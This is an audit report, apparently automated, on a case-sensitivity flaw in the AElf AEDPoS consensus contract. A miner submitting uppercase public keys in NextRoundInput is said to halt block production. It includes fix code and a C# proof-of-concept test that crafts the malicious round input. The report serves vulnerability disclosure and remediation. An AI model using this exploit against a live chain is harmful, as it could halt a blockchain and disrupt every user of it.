# Audit Report

## Title
Hex String Case Sensitivity Bypass in Consensus Round Transitions Enables Complete Blockchain Halt

## Summary
The AEDPoS consensus contract fails to normalize hexadecimal string casing when processing `NextRoundInput`, allowing an authorized miner to inject uppercase public key strings into the round state. This causes a fatal mismatch with the lowercase keys produced by the `ToHex()` method, permanently blocking all subsequent miners from mining and halting consensus indefinitely.

## Finding Description

The vulnerability arises from a case sensitivity mismatch in the consensus round transition logic. The `ToHex()` extension method deterministically produces lowercase hexadecimal strings by adding `0x20` to convert uppercase ASCII values to lowercase. [1](#0-0) 

When miners produce blocks, their public keys are recovered and converted to hex strings using this method, guaranteeing lowercase output. [2](#0-1) 

The `NextRound` method is publicly accessible and accepts `NextRoundInput` containing a protobuf map of miner public keys to miner information. [3](#0-2) 

The `NextRoundInput.ToRound()` method performs a direct field copy without any case normalization. [4](#0-3) 

The authorization check in `PreCheck()` validates the sender's recovered public key (lowercase) against the **current** round's miner list, but does not validate the public key strings **within** the incoming `NextRoundInput`. [5](#0-4) 

After passing authorization, `ProcessNextRound` stores the new round directly without case normalization. [6](#0-5) 

### Attack Execution Path

1. **Attacker prerequisites**: Attacker controls a current miner (has a legitimate slot in the current round with lowercase pubkey)
2. **Malicious transaction**: Attacker crafts a `NextRoundInput` with uppercase public key strings instead of the standard lowercase format
3. **Authorization bypass**: `PreCheck()` validates the attacker's recovered pubkey (lowercase) against current round (lowercase) - passes âœ“
4. **Validation bypass**: No validator checks pubkey case in the incoming round data
5. **State corruption**: New round is stored with uppercase public keys via `AddRoundInformation()`
6. **Consensus failure**: All subsequent miners attempt to produce blocks, but their recovered pubkeys (lowercase via `ToHex()`) fail the `IsInMinerList()` check because the stored round has uppercase keys

The `IsInMinerList()` method performs case-sensitive dictionary key lookup. [7](#0-6) 

The mining permission validator also performs case-sensitive key lookup, causing all miners to be rejected. [8](#0-7) 

Additionally, `GetMinerReplacementInformation` in the Election contract uses case-sensitive `Contains()` checks that would fail to properly filter miners if case mismatches occur. [9](#0-8) 

## Impact Explanation

**Critical Severity - Complete Blockchain Halt**

This vulnerability enables a single malicious or compromised miner to permanently halt the entire blockchain. Once uppercase public keys are stored in a round:

1. **Immediate consensus DoS**: All miners (including the attacker) are locked out because their recovered public keys (lowercase) don't match the stored uppercase keys
2. **Irreversible without hard fork**: The corrupted round state is committed to the blockchain. Normal operations cannot recover since no miner can pass authorization
3. **No automatic recovery**: Unlike temporary network issues, this is a persistent state corruption that breaks the fundamental consensus mechanism
4. **Affects all chain operations**: Token transfers, contract calls, governance - everything stops when blocks stop being produced

The attack breaks the core security guarantee of consensus availability and violates the invariant that authorized miners in the current round can produce blocks in the next round.

## Likelihood Explanation

**High Likelihood of Exploitation**

**Attacker Requirements:**
- Must be an authorized miner in the current round (moderate barrier)
- Must be able to craft custom transactions (trivial for any miner)
- Must wait for their designated time slot (guaranteed in normal operation)

**Attack Complexity:** Very Low
- Requires only changing hex string casing in a single transaction
- No sophisticated cryptography, timing attacks, or race conditions
- Standard transaction submission through normal node RPC

**Feasibility Scenarios:**
1. **Compromised miner keys**: If an attacker gains control of any miner's private key, they can execute this attack
2. **Malicious insider**: A validator with malicious intent can trivially DOS their own chain
3. **Software bugs**: A buggy mining client that accidentally uses uppercase hex strings would trigger this
4. **Cross-chain incentive misalignment**: In multi-chain scenarios, attacking one chain might benefit another

**Detection:**
The attack would be immediately obvious (consensus stops), but by then it's too late - the corrupted state is already committed to the blockchain.

While the economic rationality of a miner attacking their own chain is questionable, the **defense-in-depth** principle mandates that the code should validate and normalize user inputs regardless of trust assumptions. The trivial attack complexity and catastrophic impact make this a critical vulnerability.

## Recommendation

Implement case normalization for all public key strings in consensus round processing:

```csharp
public Round ToRound()
{
    var normalizedMiners = new Dictionary<string, MinerInRound>();
    foreach (var miner in RealTimeMinersInformation)
    {
        // Normalize all pubkey strings to lowercase
        var normalizedKey = miner.Key.ToLower();
        normalizedMiners[normalizedKey] = miner.Value;
        // Also normalize the Pubkey field within MinerInRound
        if (miner.Value.Pubkey != null)
        {
            miner.Value.Pubkey = miner.Value.Pubkey.ToLower();
        }
    }
    
    return new Round
    {
        RoundNumber = RoundNumber,
        RealTimeMinersInformation = { normalizedMiners },
        ExtraBlockProducerOfPreviousRound = ExtraBlockProducerOfPreviousRound?.ToLower(),
        // ... other fields
    };
}
```

Additionally, add validation in `ProcessNextRound` to ensure all pubkeys are lowercase:

```csharp
private void ProcessNextRound(NextRoundInput input)
{
    var nextRound = input.ToRound();
    
    // Validate all pubkeys are lowercase
    foreach (var minerKey in nextRound.RealTimeMinersInformation.Keys)
    {
        Assert(minerKey == minerKey.ToLower(), $"Invalid pubkey format: {minerKey}. All pubkeys must be lowercase.");
    }
    
    // ... rest of method
}
```

Apply similar normalization to `NextTermInput` and any other consensus input types that handle public keys.

## Proof of Concept

```csharp
[Fact]
public async Task CaseSensitivityBypassCausesConsensusHalt()
{
    // Setup: Initialize consensus with 3 miners
    var initialMiners = new[] { "miner1", "miner2", "miner3" };
    await InitializeConsensusWithMiners(initialMiners);
    
    // Step 1: Get current round with lowercase pubkeys (normal state)
    var currentRound = await ConsensusStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var firstMinerPubkey = currentRound.RealTimeMinersInformation.Keys.First();
    
    // Verify current state has lowercase keys (from ToHex())
    Assert.Equal(firstMinerPubkey.ToLower(), firstMinerPubkey);
    
    // Step 2: Malicious miner crafts NextRoundInput with UPPERCASE pubkeys
    var maliciousNextRound = CreateNextRoundWithUppercaseKeys(currentRound);
    
    // Step 3: Submit malicious NextRound transaction (will pass PreCheck)
    var result = await ConsensusStub.NextRound.SendAsync(maliciousNextRound);
    result.TransactionResult.Status.ShouldBe(TransactionResultStatus.Mined);
    
    // Step 4: Verify corrupted state - round now has UPPERCASE keys
    var corruptedRound = await ConsensusStub.GetCurrentRoundInformation.CallAsync(new Empty());
    var corruptedKey = corruptedRound.RealTimeMinersInformation.Keys.First();
    Assert.Equal(corruptedKey.ToUpper(), corruptedKey);
    Assert.NotEqual(corruptedKey.ToLower(), corruptedKey);
    
    // Step 5: Next miner attempts to produce block - FAILS
    // Recovered pubkey is lowercase (from ToHex), but round has uppercase keys
    var nextMinerStub = GetConsensusStubForMiner("miner2");
    var consensusCommand = await nextMinerStub.GetConsensusCommand.CallAsync(new BytesValue());
    
    // Mining permission validation fails due to case mismatch
    var updateResult = await nextMinerStub.UpdateValue.SendAsync(
        CreateUpdateValueInput(consensusCommand));
    
    // Assert: Transaction fails - miner not in list (case mismatch)
    updateResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
    updateResult.TransactionResult.Error.ShouldContain("not a miner");
    
    // Step 6: Verify consensus is permanently halted - NO miner can produce blocks
    foreach (var miner in initialMiners)
    {
        var minerStub = GetConsensusStubForMiner(miner);
        var attemptResult = await minerStub.UpdateValue.SendAsync(
            CreateUpdateValueInput(await minerStub.GetConsensusCommand.CallAsync(new BytesValue())));
        attemptResult.TransactionResult.Status.ShouldBe(TransactionResultStatus.Failed);
    }
}

private NextRoundInput CreateNextRoundWithUppercaseKeys(Round currentRound)
{
    var maliciousRound = new NextRoundInput
    {
        RoundNumber = currentRound.RoundNumber + 1,
        TermNumber = currentRound.TermNumber
    };
    
    // CRITICAL: Convert all pubkeys to UPPERCASE
    foreach (var miner in currentRound.RealTimeMinersInformation)
    {
        maliciousRound.RealTimeMinersInformation[miner.Key.ToUpper()] = new MinerInRound
        {
            Pubkey = miner.Key.ToUpper(), // Uppercase injection
            Order = miner.Value.Order,
            ExpectedMiningTime = miner.Value.ExpectedMiningTime.AddSeconds(4000)
        };
    }
    
    return maliciousRound;
}
```

This test demonstrates that after a malicious `NextRoundInput` with uppercase keys is accepted, all subsequent mining attempts fail due to the case mismatch, permanently halting consensus.

### Citations

**File:** src/AElf.Types/Extensions/ByteExtensions.cs (L38-41)
```csharp
                c[cx] = (char)(b > 9 ? b + 0x37 + 0x20 : b + 0x30);

                b = (byte)(bytes[bx] & 0x0F);
                c[++cx] = (char)(b > 9 ? b + 0x37 + 0x20 : b + 0x30);
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L108-159)
```csharp
    private void ProcessNextRound(NextRoundInput input)
    {
        var nextRound = input.ToRound();
        
        RecordMinedMinerListOfCurrentRound();

        TryToGetCurrentRoundInformation(out var currentRound);

        // Do some other stuff during the first time to change round.
        if (currentRound.RoundNumber == 1)
        {
            // Set blockchain start timestamp.
            var actualBlockchainStartTimestamp =
                currentRound.FirstActualMiner()?.ActualMiningTimes.FirstOrDefault() ??
                Context.CurrentBlockTime;
            SetBlockchainStartTimestamp(actualBlockchainStartTimestamp);

            // Initialize current miners' information in Election Contract.
            if (State.IsMainChain.Value)
            {
                var minersCount = GetMinersCount(nextRound);
                if (minersCount != 0 && State.ElectionContract.Value != null)
                {
                    State.ElectionContract.UpdateMinersCount.Send(new UpdateMinersCountInput
                    {
                        MinersCount = minersCount
                    });
                }
            }
        }

        if (State.IsMainChain.Value && // Only detect evil miners in Main Chain.
            currentRound.TryToDetectEvilMiners(out var evilMiners))
        {
            Context.LogDebug(() => "Evil miners detected.");
            foreach (var evilMiner in evilMiners)
            {
                Context.LogDebug(() =>
                    $"Evil miner {evilMiner}, missed time slots: {currentRound.RealTimeMinersInformation[evilMiner].MissedTimeSlots}.");
                // Mark these evil miners.
                State.ElectionContract.UpdateCandidateInformation.Send(new UpdateCandidateInformationInput
                {
                    Pubkey = evilMiner,
                    IsEvilNode = true
                });
            }
        }

        AddRoundInformation(nextRound);

        Assert(TryToUpdateRoundNumber(nextRound.RoundNumber), "Failed to update round number.");
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract_ProcessConsensusInformation.cs (L316-331)
```csharp
    private bool PreCheck()
    {
        TryToGetCurrentRoundInformation(out var currentRound);
        TryToGetPreviousRoundInformation(out var previousRound);

        _processingBlockMinerPubkey = Context.RecoverPublicKey().ToHex();

        // Though we've already prevented related transactions from inserting to the transaction pool
        // via ConstrainedAEDPoSTransactionValidationProvider,
        // this kind of permission check is still useful.
        if (!currentRound.IsInMinerList(_processingBlockMinerPubkey) &&
            !previousRound.IsInMinerList(_processingBlockMinerPubkey)) // Case a failed miner performing NextTerm
            return false;

        return true;
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/AEDPoSContract.cs (L161-165)
```csharp
    public override Empty NextRound(NextRoundInput input)
    {
        SupplyCurrentRoundInformation();
        ProcessConsensusInformation(input);
        return new Empty();
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/NextRoundInput.cs (L25-40)
```csharp
    public Round ToRound()
    {
        return new Round
        {
            RoundNumber = RoundNumber,
            RealTimeMinersInformation = { RealTimeMinersInformation },
            ExtraBlockProducerOfPreviousRound = ExtraBlockProducerOfPreviousRound,
            BlockchainAge = BlockchainAge,
            TermNumber = TermNumber,
            ConfirmedIrreversibleBlockHeight = ConfirmedIrreversibleBlockHeight,
            ConfirmedIrreversibleBlockRoundNumber = ConfirmedIrreversibleBlockRoundNumber,
            IsMinerListJustChanged = IsMinerListJustChanged,
            RoundIdForValidation = RoundIdForValidation,
            MainChainMinersRoundNumber = MainChainMinersRoundNumber
        };
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/Types/Round.cs (L137-140)
```csharp
    public bool IsInMinerList(string pubkey)
    {
        return RealTimeMinersInformation.Keys.Contains(pubkey);
    }
```

**File:** contract/AElf.Contracts.Consensus.AEDPoS/ConsensusHeaderInfoValidationProviders/MiningPermissionValidationProvider.cs (L17-20)
```csharp
        if (!validationContext.BaseRound.RealTimeMinersInformation.Keys.Contains(validationContext.SenderPubkey))
        {
            validationResult.Message = $"Sender {validationContext.SenderPubkey} is not a miner.";
            return validationResult;
```

**File:** contract/AElf.Contracts.Election/ViewMethods.cs (L387-391)
```csharp
            var selectedInitialMiners = State.InitialMiners.Value.Value
                .Select(k => k.ToHex())
                .Where(k => !State.BannedPubkeyMap[k])
                .Where(k => !input.CurrentMinerList.Contains(k)).Take(takeAmount);
            alternativeCandidates.AddRange(selectedInitialMiners);
```
